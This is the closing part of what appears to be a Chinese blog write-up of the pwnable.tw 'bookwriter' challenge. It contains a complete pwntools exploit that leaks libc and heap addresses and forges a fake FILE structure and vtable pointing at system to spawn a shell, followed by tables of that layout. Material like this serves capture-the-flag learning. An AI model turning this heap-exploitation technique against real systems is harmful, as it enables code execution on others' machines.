+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+
+<span class="token comment">#p = process("./bookwriter", env = &#123;"LD_PRELOAD":"./libc.so.6"&#125;)</span>
+p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"chall.pwnable.tw"</span><span class="token punctuation">,</span> <span class="token number">10304</span><span class="token punctuation">)</span>
+elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./bookwriter"</span><span class="token punctuation">)</span>
+libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./libc_64.so.6"</span><span class="token punctuation">)</span>
+context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">"debug"</span>
+
+<span class="token keyword">def</span> <span class="token function">send_choice</span><span class="token punctuation">(</span>idx<span class="token punctuation">:</span><span class="token builtin">int</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"Your choice :"</span><span class="token punctuation">)</span>
+    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+<span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    send_choice<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
+    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"Size of page :"</span><span class="token punctuation">)</span>
+    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"Content :"</span><span class="token punctuation">)</span>
+    p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>content<span class="token punctuation">)</span>
+
+<span class="token keyword">def</span> <span class="token function">view</span><span class="token punctuation">(</span>idx<span class="token punctuation">:</span><span class="token builtin">int</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    send_choice<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>
+    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"Index of page :"</span><span class="token punctuation">)</span>
+    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+<span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>idx<span class="token punctuation">:</span><span class="token builtin">int</span><span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    send_choice<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>
+    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"Index of page :"</span><span class="token punctuation">)</span>
+    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"Content:"</span><span class="token punctuation">)</span>
+    p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>content<span class="token punctuation">)</span>
+
+<span class="token keyword">def</span> <span class="token function">info</span><span class="token punctuation">(</span>new_author<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    send_choice<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>
+    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"(yes:1 / no:0)"</span><span class="token punctuation">)</span>
+    <span class="token keyword">if</span> new_author <span class="token operator">!=</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
+        p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b"1"</span><span class="token punctuation">)</span>
+        p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"Author :"</span><span class="token punctuation">)</span>
+        p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>new_author<span class="token punctuation">)</span>
+    <span class="token keyword">else</span><span class="token punctuation">:</span>
+        p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b"0"</span><span class="token punctuation">)</span>
+
+<span class="token keyword">def</span> <span class="token function">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    send_choice<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>
+
+<span class="token keyword">def</span> <span class="token function">exp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token comment"># const</span>
+    bss_author <span class="token operator">=</span> <span class="token number">0x602060</span>
+    bss_catalog <span class="token operator">=</span> <span class="token number">0x6020a0</span>
+    bss_sizelist <span class="token operator">=</span> <span class="token number">0x6020e0</span>
+
+    <span class="token comment"># set author</span>
+    author <span class="token operator">=</span> <span class="token string">b"a"</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x40</span><span class="token operator">-</span><span class="token number">0x2</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b"||"</span>
+    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"Author :"</span><span class="token punctuation">)</span>
+    p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>author<span class="token punctuation">)</span>
+
+    add<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">,</span> <span class="token string">b"aaa"</span><span class="token punctuation">)</span> 
+
+    edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">b"a"</span><span class="token operator">*</span><span class="token number">0x18</span><span class="token punctuation">)</span>
+    edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">b"a"</span><span class="token operator">*</span><span class="token number">0x18</span><span class="token operator">+</span><span class="token string">b"\xe1\x0f\x00"</span><span class="token punctuation">)</span> 
+    info<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    add<span class="token punctuation">(</span><span class="token number">0x78</span><span class="token punctuation">,</span> <span class="token string">b"aaaaaaaa"</span><span class="token punctuation">)</span> 
+    view<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
+
+    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"Content :\naaaaaaaa"</span><span class="token punctuation">)</span>
+    libc_leak <span class="token operator">=</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"\n"</span><span class="token punctuation">,</span> drop<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b"\x00"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+    libc_base <span class="token operator">=</span> libc_leak <span class="token operator">-</span> <span class="token number">0x3c4188</span>
+    system <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">b"system"</span><span class="token punctuation">]</span>
+    stdout <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0x3c5620</span>
+    io_list_all <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">b"_IO_list_all"</span><span class="token punctuation">]</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"libc_leak:"</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>libc_leak<span class="token punctuation">)</span><span class="token punctuation">)</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"libc_base:"</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"stdout:"</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>stdout<span class="token punctuation">)</span><span class="token punctuation">)</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"io_list_all:"</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>io_list_all<span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+    send_choice<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span> 
+    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"||"</span><span class="token punctuation">)</span>
+    heap_leak <span class="token operator">=</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"\n"</span><span class="token punctuation">,</span> drop<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b"\x00"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+    heap_base <span class="token operator">=</span> heap_leak <span class="token operator">-</span> <span class="token number">0x10</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"heap_leak:"</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>heap_leak<span class="token punctuation">)</span><span class="token punctuation">)</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"heap_base:"</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>heap_base<span class="token punctuation">)</span><span class="token punctuation">)</span>
+    p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b"(yes:1 / no:0)"</span><span class="token punctuation">,</span> <span class="token string">b"0\n"</span><span class="token punctuation">)</span>
+
+    chunk1_addr <span class="token operator">=</span> heap_base <span class="token operator">+</span> <span class="token number">0x20</span> 
+    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"chunk1_addr:"</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>chunk1_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+    edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">b"\n"</span><span class="token punctuation">)</span>
+    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        add<span class="token punctuation">(</span><span class="token number">0x58</span><span class="token punctuation">,</span> <span class="token string">b"bbbb"</span><span class="token punctuation">)</span>
+
+    pad <span class="token operator">=</span> <span class="token string">b"a"</span><span class="token operator">*</span><span class="token number">0x330</span>
+
+    data <span class="token operator">=</span> <span class="token string">b'/bin/sh\x00'</span>
+    data <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x61</span><span class="token punctuation">)</span>
+    data <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0xdeadbeef</span><span class="token punctuation">)</span>
+    data <span class="token operator">+=</span> p64<span class="token punctuation">(</span>libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">b'_IO_list_all'</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">0x10</span><span class="token punctuation">)</span>
+    data <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>
+    data <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>
+    data <span class="token operator">=</span> data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0xc0</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span>
+    data <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0xffffffffffffffff</span><span class="token punctuation">)</span>
+    data <span class="token operator">=</span> data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0xe0</span><span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span>
+    vtable <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">3</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">b'system'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+    vtable_addr <span class="token operator">=</span> heap_base <span class="token operator">+</span> <span class="token number">0x420</span>
+    data <span class="token operator">+=</span> p64<span class="token punctuation">(</span>vtable_addr<span class="token punctuation">)</span>
+    data <span class="token operator">+=</span> vtable
+    edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> pad<span class="token operator">+</span>data<span class="token punctuation">)</span>
+    edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">b"\n"</span><span class="token punctuation">)</span>
+
+    send_choice<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
+    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"Size of page :"</span><span class="token punctuation">)</span>
+    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b"16"</span><span class="token punctuation">)</span>
+
+    <span class="token comment">#gdb.attach(p)</span>
+
+    p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
+    exp<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>然后就打通了 附上构造图表</p>
+<table>
+<thead>
+<tr>
+<th>top</th>
+<th>chunk</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>&#x2F;bin&#x2F;sh\0</td>
+<td>0x61</td>
+</tr>
+<tr>
+<td>随意</td>
+<td>IO_list_all-0x10</td>
+</tr>
+<tr>
+<td>2</td>
+<td>3</td>
+</tr>
+<tr>
+<td>0</td>
+<td>0</td>
+</tr>
+<tr>
+<td>0</td>
+<td>0</td>
+</tr>
+<tr>
+<td>0</td>
+<td>0</td>
+</tr>
+<tr>
+<td>0</td>
+<td>0</td>
+</tr>
+<tr>
+<td>0</td>
+<td>0</td>
+</tr>
+<tr>
+<td>0</td>
+<td>0</td>
+</tr>
+<tr>
+<td>fffffffffffffff</td>
+<td>0</td>
+</tr>
+<tr>
+<td>0</td>
+<td>0</td>
+</tr>
+<tr>
+<td>0</td>
+<td>0</td>
+</tr>
+<tr>
+<td>0</td>
+<td>0</td>
+</tr>
+<tr>
+<td>0</td>
+<td>vtable_addr</td>
+</tr>
+<tr>
+<td>vtable(其实这里就是vtable的首地址)</td>
+<td></td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+</tr>
+</tbody></table>
+<table>
+<thead>
+<tr>
+<th>vtable</th>
+<th>addr</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>0</td>
+<td>0</td>
+</tr>
+<tr>
+<td>0</td>
+<td>system_addr</td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+</tr>
+</tbody></table>
+
+          <div class="post-tags">
+            <!-- 文章tags -->
+            
+          </div>
+          <p class="motto">重拾纯粹的写作</p>
+        </article>
+        <!-- 评论 -->
+        <div id="vcomments"></div>
+      </div>
+    </main>
+    <!-- toc -->
+    
+    <cosy-drag-box id="toc-drag-box" trigger="left" min-width="220" uid="toc-box">
+      <div class="meta-container">
+        <div class="toc-wrapper cosy-scrollbar">
+          <p class="catalog">
+            <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 24 24">
+              <g fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                <path d="M4 6h16"></path>
+                <path d="M4 12h16"></path>
+                <path d="M4 18h12"></path>
+              </g>
+            </svg>
+            <span>目录</span>
+          </p>
+          <!-- 文章toc -->
+          <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#pwnable-bookwriter"><span class="toc-number">1.</span> <span class="toc-text">pwnable_bookwriter</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%89%A7%E8%A1%8Cfsop%E7%9A%84%E6%9D%A1%E4%BB%B6%EF%BC%9A"><span class="toc-number">1.1.</span> <span class="toc-text">执行fsop的条件：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%BB%E8%A6%81%E6%BC%8F%E6%B4%9E%EF%BC%9A"><span class="toc-number">1.2.</span> <span class="toc-text">主要漏洞：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90"><span class="toc-number">1.3.</span> <span class="toc-text">静态分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8"><span class="toc-number">1.4.</span> <span class="toc-text">漏洞的利用</span></a></li></ol></li></ol>
+        </div>
+      </div>
+    </cosy-drag-box>
+    
+  </div>
+
+</div>
+
+<script>
+  window.page = {
+    use: ''
+  }
+  window.katex = {
+    enable: "",
+    jsCdn: "//cdn.jsdelivr.net/npm/katex@0.13.18/dist/katex.min.js",
+    cssCdn: "//cdn.jsdelivr.net/npm/katex@0.13.18/dist/katex.min.css"
+  }
+  window.mermaid = {
+    enable: "",
+    theme: "",
+    cdn: "//cdn.jsdelivr.net/npm/mermaid@10.4.0/dist/mermaid.min.js",
+  }
+  window.valine = {
+    enable: "",
+    appId: '4Q4EAMdq8elmFDwiIj0R0Z80-gzGzoHsz',
+    appKey: 'JRv5ulQZAwmbGgfeetCXRvoW',
+    avatar: 'monsterid',
+    cdn: '//unpkg.com/valine@latest/dist/Valine.min.js',
+    serverURLs: ''
+  };
+</script>
+
+
+<script src="/js/0af3d6bb.js"></script>
+
+  </main>
+</body>
+
+<script>
+  window.theme = {
+    color: 'hsl(238,50%,56%)'
+  }
+</script>
+
+
+<script src="/js/69a216b6.js"></script>
+
+
+</html>
